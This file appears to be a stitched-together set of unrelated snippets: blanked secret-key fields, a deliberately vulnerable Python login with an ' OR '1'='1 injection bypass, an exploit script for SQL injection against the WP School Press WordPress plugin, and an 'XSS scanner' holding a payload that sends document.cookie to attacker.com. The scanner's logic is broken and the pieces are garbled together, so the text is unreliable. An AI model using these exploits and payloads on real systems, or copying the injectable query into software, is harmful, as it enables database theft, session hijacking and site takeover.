import sqlite3
 token: abc123def456ghi789jkl012mno345pqr678rrrrr

----
# AWS IAM ID  
aws_iam_id: "_" 








# Airtable   
airtable_api_key:  " "

airtable_app_pattern:  "__"

# Alibaba 
alibaba_id: "_deleted_"
alibaba_id: "_deleted_"
# Other Sensitive Information 
email_id: "_delete_" 
adafruitio: "Deleted"
def login(username, password):
    # Vulnerable SQL query
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
 
    # Connecting to the database
    connection = sqlite3.connect("database.db")
    cursor = connection.cursor()
 
    # Executing the query
    cursor.execute(query)
 
    # Fetching the results
    result = cursor.fetchone()
 
    # Closing the connection
    connection.close()
 
    return result
 
# Example usage (vulnerable)
username = "admin' OR '1'='1'; --"
password = "password"
result = login(username, password)
 
# Check if login was successful
if result:
    print("Login successful!")
else:
    print("Login failed.")















# Exploit Title: Union-Based SQL Injection in multiple pages of the site
# Date: 2020-08-20
# Exploit Author: Jinson Varghese
# Vendor Homepage: https://www.wpschoolpress.com/
# Software Link: https://wordpress.org/plugins/school-management-system-171/
# Version: 2.0.4
# Tested on: Windows 10
# Reference: https://www.vavkamil.cz/2020/08/wordpress-plugins-wp-school-press-lfi-to-sqli-to-rce.html
# Description: "WP School Press" plugin, which is vulnerable to Union Based SQL Injection in the parameter id and also Local File Inclusion in the parameter css_file
# Then it can lead to Remote Code Execution by uploading a new webshell to the target server
import requests
import sys
from time import sleep
def request(url):
    print ("[*] Requesting: "+url)
    sleep(1)
    return requests.get(url).text
def get_column_count(url):
    print ("[*] Finding column count")
    for i in range(1,1000):
        resp = request(url+"+union+select+1")
        if "Unknown column" in resp:
            print ("[*] Column count: "+str(i-1))
            return i-1
def get_table_name(url, column_count):
    table_name = ""
    print ("[*] Finding table name")
    for i in range(1,column_count+1):
        tables = "abcdefghijklmnopqrstuvwxyz_"
        for table in tables:
            resp = request(url+f" and (select ascii(substring((select table_name from information_schema.tables where table_schema=database() limit {i-1},1),1,1)))={ord(table)}")
            if "Unknown column" in resp:
                table_name += table
                print ("[*] Table name: "+table_name)
                break
    return table_name
def get_data(url, column_count, table_name):
    print ("[*] Retrieving data")
    for i in range(1,column_count+1):
        data = ""
        print ("[*] Retrieving data from column: "+str(i))
        for j in range(1,1000):
            found = False
            for k in range(32,126):
                resp = request(url+f" and (select ascii(substring((select group_concat(column_name) from information_schema.columns where table_name='{table_name}' limit {i-1},1),1,1)))={k}")
                if "Unknown column" in resp:
                    data += chr(k)
                    found = True
                    print ("[*] Data: "+data)
                    break
            if not found:
                break
    return
def main():
    url = sys.argv[1]
    column_count = get_column_count(url)
    table_name = get_table_name(url, column_count)
    get_data(url, column_count, table_name)
if __name__ == "__main__":
    main()



from bs4 import BeautifulSoup
import requests
# The URL of the target website
url = 'http://www.example.com'
# The JavaScript payload to be injected
payload = 'document.location="http://www.attacker.com/?cookie="+document.cookie'
# A dictionary to store the XSS vulnerable parameters and their values
parameters = {}
# Send a GET request to the target website
r = requests.get(url)
# Parse the response using BeautifulSoup
soup = BeautifulSoup(r.text, 'html.parser')
# Find all the script elements in the HTML
scripts = soup.find_all('script')
# Loop through the scripts
for script in scripts:
    # Check if the payload is present in the script
    if payload in script:
        # If it is, the parameter is vulnerable
        parameters[payload] = script
# Print the results
for param, value in parameters.items():
    print('The parameter {} is vulnerable to XSS'.format(param))
has context menu
